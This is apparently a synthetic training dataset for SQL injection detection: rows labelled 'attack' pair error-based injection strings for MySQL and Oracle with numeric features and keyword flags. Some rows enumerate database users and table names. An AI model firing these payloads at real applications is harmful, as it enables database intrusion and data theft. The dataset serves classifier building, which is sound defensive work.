id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000541,attack,error,"1'||  (  select 'wqmz' where 6400  =  6400 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",nearest_attack_euclidean,R000043,1.148515410699105,341.0969621600791,41.096962160079094,4.068065054490667,114.0,63.0,124.0,40.096962160079094,0.33421866454894206,0.18469978830336273,0.3635360912637615,0.11754545588393367,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,8.096962160079094,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.5484810800395469,7.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,15.0
SMOTE_000542,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000135,0.9693164674040199,329.28825612214825,31.372891836708543,3.542786070856639,89.55933775506281,45.0,138.23735102025125,56.491567346834174,0.2720789564591001,0.13675533576041848,0.41973418434102117,0.17143152343946025,0.7457836734170871,0.0,0.0,0.0,1.1102230246251565e-16,2.1864459183542717,0.0,29.186445918354273,0.3728918367085436,3.0,0.0,22.186445918354273,0.1864459183542717,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1864459183542717,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.186445918354272
SMOTE_000543,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000054,1.2567353679599649,189.99241676415738,29.556398137315846,3.624154082379973,49.887203725368316,37.225592549263375,77.43601862684156,25.443601862684154,0.2625969526185496,0.1962849727146636,0.4071864637664472,0.13393161090033961,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,14.887203725368312,2.7755575615628914e-17,-1.1102230246251565e-16,5.556398137315844,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.5563981373158442,0.44360186268415597,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000544,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000101,0.18025683149413751,190.21971166375238,27.087884665500955,3.4404395731697575,36.65913499125716,46.47269200699428,83.0,24.087884665500955,0.1926403786354595,0.24438556094824698,0.4363499036952376,0.12662415672105598,0.17576933100190817,0.0,0.0,0.0,1.1102230246251565e-16,1.956057667249523,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.956057667249523,1.9560576672495227,0.0439423327504771,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000545,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000128,0.027120339173645026,240.7905648097663,40.981788244327504,3.9177314974163333,73.89983534380127,44.927152977310016,96.96357648865501,25.0,0.3068894613790666,0.18656721708272547,0.40270922279528204,0.10383409874292593,0.0,1.0,1.0,0.0,1.0,1.9908941221637517,0.0,16.009105877836248,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.990894122163752,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.990894122163752,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.990894122163752
SMOTE_000546,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",nearest_attack_euclidean,R000125,0.07575666297516465,323.33923788884385,39.0,3.9963837169415477,112.92730616667632,55.0,119.33923788884387,36.07269383332369,0.34927732414398666,0.17010722837744796,0.36905682565455666,0.1115586218240087,4.0,0.0,0.0,0.0,2.0,1.0242312777745624,0.0,22.048462555549126,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.024231277774563,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0242312777745624,0.9757687222254376,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000547,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,0.1912687139484564,340.12770286835104,36.12210633467276,3.7631436173351434,101.04070211155758,62.674383107539306,139.65683031859965,36.75578733065448,0.2973271508263123,0.18427566127382972,0.41035077707171236,0.10804641082814569,0.0,0.0,0.0,0.0,2.0,1.9592978884424135,0.0,25.75578733065448,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.959297888442414,0.0,0.0,0.0,0.040702111557586615,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,0.9592978884424136,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.959297888442414
SMOTE_000548,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.5341491275509529,214.7146622025855,40.6858648810342,4.243452601490781,118.02879732155131,2.0,71.0,23.6858648810342,0.5496945848255141,0.009315817624904799,0.33071152568412004,0.11027807186546104,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,4.685864881034198,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000549,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,0.635066166202195,295.5477867456532,35.849067620458094,3.8204034609956836,99.09440572274855,41.79254096366474,119.56643433649133,35.094405722748554,0.33650679999403443,0.1413993211864786,0.4032884483113157,0.11880543050817123,0.0,0.0,0.0,0.0,2.0,1.8490676204580925,0.0,23.094405722748554,2.7755575615628914e-17,2.0,5.150932379541907,3.8490676204580927,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.698135240916185,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.698135240916185
SMOTE_000550,attack,error,"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000074,0.40098149687545437,193.5696170967223,31.18354407833731,3.6138622913515785,49.10126447002385,40.0,80.10126447002385,24.36708815667462,0.25353083624395056,0.20679901203246348,0.4138000705691097,0.1258700811544762,0.18354407833730857,0.0,2.0,0.0,1.0,2.0,0.0,14.18354407833731,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.18354407833730857,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000551,attack,error,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njdu"" like ""njdu",nearest_attack_euclidean,R000153,1.3614155819295766,284.0,36.650113757889265,3.9887538373681326,109.65011375788927,35.0,103.89992416140716,35.44996208070358,0.3860919498517228,0.12323943661971831,0.36584480338523645,0.12482381014332246,0.0,4.0,0.0,0.0,2.0,1.4499620807035776,0.0,20.0,2.7755575615628914e-17,2.0,5.0,3.4499620807035773,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.4499620807035778,0.5500379192964224,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000552,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000127,0.8038890017052055,216.91435761685707,30.217518479050685,3.3998774368375537,52.1742097844516,32.78248152094932,101.26180217970501,30.69586413175114,0.2405915667855974,0.15218325082415052,0.4657976913042365,0.1414274910860156,4.0,0.0,0.0,0.0,0.7391728263502282,2.0,0.0,18.956691305400913,2.7755575615628914e-17,-1.1102230246251565e-16,4.260827173649772,2.739172826350228,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.4783456527004564,0.0,0.0,0.7391728263502282,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.2175184790506846
SMOTE_000553,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000023,0.06384941799424142,192.80957585184393,29.047622108931996,3.618001523898166,55.0,32.0,79.66670952504793,26.142866326795986,0.2854321840004744,0.16606963432754873,0.41293445189236566,0.13556372977961115,4.0,0.0,0.0,0.0,1.0,2.0,0.0,14.142866326795984,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000554,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000135,0.7032091337801106,328.90320228203433,31.585480342305154,3.5720828089572967,91.92740171152576,45.0,136.39032022820345,55.585480342305154,0.27923318219081217,0.13689503587343105,0.41485858250889135,0.16901319942686543,0.7806404564068703,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,28.804839885898282,2.7755575615628914e-17,3.0,0.0,22.0,0.19516011410171752,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1951601141017176,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.195160114101718
SMOTE_000555,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000075,0.17932939913492893,315.6276877850169,38.109486991042374,4.0149282862550635,110.0,55.0,115.18973982084745,35.43794796416949,0.34869743691895355,0.17434871845947678,0.3647051112922549,0.11224873332931481,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.43794796416949,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000556,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.24825947886405153,210.05659032274576,38.75471586022881,3.8265017767590135,63.0,37.0,86.54715860228814,23.509431720457627,0.30010592132452796,0.17625268395250057,0.4117559676631631,0.11188542705980839,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.509431720457629,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000557,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.3811040719727877,213.59532331639065,39.0,3.8042477686808374,63.0,37.0,89.47625865311252,24.11906466327813,0.29496693438143146,0.17323454876369787,0.4188839927198647,0.11291452413500595,0.8809353367218702,0.1190646632781297,1.0,0.0,1.0,1.0,0.0,16.11906466327813,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,0.8809353367218704,0.1190646632781297,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000558,attack,error,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr",nearest_attack_euclidean,R000096,0.7285640253681366,344.5294733161784,39.0,3.887809420149327,112.25884199485353,55.0,137.51768398970705,39.75294733161784,0.3258364419696253,0.15966340543026866,0.39911440625864375,0.11538574634146224,0.0,4.0,0.0,0.0,2.0,1.24705266838216,0.0,25.50589466323568,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.24705266838216,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.24705266838216,0.7529473316178401,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000559,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000033,0.6210465616386444,287.02412400851716,35.151206200425854,3.9275716380971493,106.79035039659314,36.20964960340686,108.02412400851715,36.0,0.3725196224021567,0.1259925888050112,0.37598821114627234,0.12549957764655975,0.0,3.3951751982965708,0.0,0.0,2.0,2.0,0.0,20.60482480170343,2.7755575615628914e-17,2.0,5.0,4.0,0.0,0.8487937995741427,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000560,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.4464880173531611,217.2147845052255,41.05369612630638,4.297632943890944,120.16108837891912,2.0,71.0,24.053696126306374,0.5531234898476491,0.009210596966191864,0.32697619229981073,0.11068972088634825,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,5.580544189459561,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000561,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000086,1.146490222765888,187.05736575956217,31.371577173041437,3.8128599187856733,48.68578858652072,43.22946303824863,69.45632554827208,25.68578858652072,0.2602678933883654,0.23089254918031402,0.37153545321863285,0.13730410421268774,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.62842282695856,2.7755575615628914e-17,-1.1102230246251565e-16,5.68578858652072,3.371577173041439,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.6857885865207196,0.0,0.6857885865207195,0.0,1.3142114134792806,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.68578858652072
SMOTE_000562,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000156,0.5856006473566349,328.8833527078453,33.372215764051575,3.5149545105881392,81.48886305620631,51.255568471896844,140.1389211797421,56.0,0.2478549999244338,0.15582120515261882,0.42604197441826475,0.1702818205046826,0.18610788202578887,0.0,1.0,0.0,1.1102230246251565e-16,2.0,0.0,29.627784235948422,2.7755575615628914e-17,0.5583236460773668,0.8138921179742113,22.999999999999996,0.18610788202578893,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000563,attack,error,"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",nearest_attack_euclidean,R000134,1.6922870656691238,274.5993233617515,36.0,4.003230313091304,109.19864672350295,35.0,97.59932336175147,32.80135327649705,0.3976602824043882,0.1274588411723782,0.3554224317854016,0.119458444637832,2.2020299147455766,0.0,0.0,0.0,2.0,1.4006766382485254,0.0,18.599323361751473,2.7755575615628914e-17,2.0,5.0,3.4006766382485254,1.0,0.0,0.0,0.5993233617514746,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.4006766382485256,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.400676638248525
SMOTE_000564,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.19938390046646084,212.0845028908287,40.45774855458565,4.201313593877935,116.0845028908287,2.0,71.0,23.0,0.5473215238564944,0.009430801586323034,0.3347934563144678,0.10845421824271492,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,3.771125722707175,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
